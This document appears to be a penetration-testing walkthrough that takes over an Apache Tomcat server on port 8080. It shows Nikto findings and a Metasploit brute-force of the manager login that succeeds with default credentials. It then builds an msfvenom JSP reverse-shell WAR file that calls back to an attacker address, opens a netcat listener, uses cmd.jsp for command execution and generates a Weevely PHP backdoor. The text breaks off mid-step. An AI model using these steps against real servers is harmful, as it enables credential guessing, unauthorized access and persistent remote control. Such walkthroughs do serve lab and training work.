# Exploting Tomcat on Port 8080

From our earlier Nmap and Nikto scans we have identified Tomcat as runnning on Port 8080.
```
+ /: Appears to be a default Apache Tomcat install.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 'tomcat'). Apache Tomcat.
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
```

## Attempt to Bruteforce authentication credentials using MetaSploit
Load up MetaSploit console and select the tomcat manager login module
`msf > use auxiliary/scanner/http/tomcat_mgr_login `

Show the options and supply the required information
```
Module options (auxiliary/scanner/http/tomcat_mgr_login):

   Name              Current Setting                                                                 Required  Description
   ----              ---------------                                                                 --------  -----------
   BLANK_PASSWORDS   false                                                                           no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                               yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                           no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                           no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                           no        Add all users in the current database to the list
   PASSWORD                                                                                          no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                                                                                            yes       The target address range or CIDR identifier
   RPORT             8080                                                                            yes       The target port
   SSL               false                                                                           no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                                           yes       Stop guessing when a credential works for a host
   TARGETURI         /manager/html                                                                   yes       URI for Manager login. Default is /manager/html
   THREADS           1                                                                               yes       The number of concurrent threads
   USERNAME                                                                                          no        A specific username to authenticate as
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
e   USER_AS_PASS      false                                                                           no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                            yes       Whether to print output for all attempts
   VHOST                                                                                             no        HTTP server virtual host

```

### Type `run`
```
msf auxiliary(tomcat_mgr_login) > run
T
[!] No active DB -- Credential data will not be saved!
[-] 172.31.6.2:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:admin (Incorrect: )
[-] 172.31.6.2:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:manager (Incorrect: )
[-] 172.31.6.2:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:role1 (Incorrect: )
[-] 172.31.6.2:8080 TOMCAT_MGR - LOGIN FAILED: tomcat:root (Incorrect: )
[+] 172.31.6.2:8080 - LOGIN SUCCESSFUL: tomcat:tomcat
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

## Use the Acquired Authentication credentials and login
* In a url modify the string in the address bar:

* Enter the authentication credentials discovered in the msf scan
![alt tag](https://user-images.githubusercontent.com/8903296/29285537-b60635f0-8126-11e7-926b-2cce147e56ec.PNG)

Scroll down the page and you will find a form that allows users to upload .war files
![alt tag](https://user-images.githubusercontent.com/8903296/29288490-d7b18ea2-8130-11e7-8cf0-3606619cc82b.PNG)

## Create the .war file
Create the .war file using msfvenom:
`msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.27.233.187 LPORT=12345 -f war > r_jsp_shell_12345.war
Payload size: 1093 bytes`

## Create a netcat listener
`nc -nlvp 12345
listening on [any] 12345 ...
`

## Upload and Deploy the .war file
* Click the `Browse` button navigating to the created .war file
![alt tag](https://user-images.githubusercontent.com/8903296/29289641-3544a2da-8135-11e7-854f-929eb08272ce.PNG)
* Click Deploy

## Open up a listener 
`nc -nlvp 12345
listening on [any] 12345 ...`


When the shell connects escalate your privileges

# Alternative way of uploading a shell
The Tomcat manager has a directory containing cmd which will allow an authenticated user to run shell commands through the browser.

## Testing out the theory
In the address bar append `cmd/cmd.jsp?cmd=ls` to see if we can get a listing of the directory contents


## Use Weevely to generate a shell
`weevely generate passw0rd ~/Documents/infosecaddicts/tomcat.php
Generated backdoor with password 'passw0rd' in '/root/Documents/tomcat.php' of 1439 byte size.
`
# Upload the shell to the vulnerable webserver
In a terminal type `python -m SimpleHTTPServer`

Now in the browser enter ``
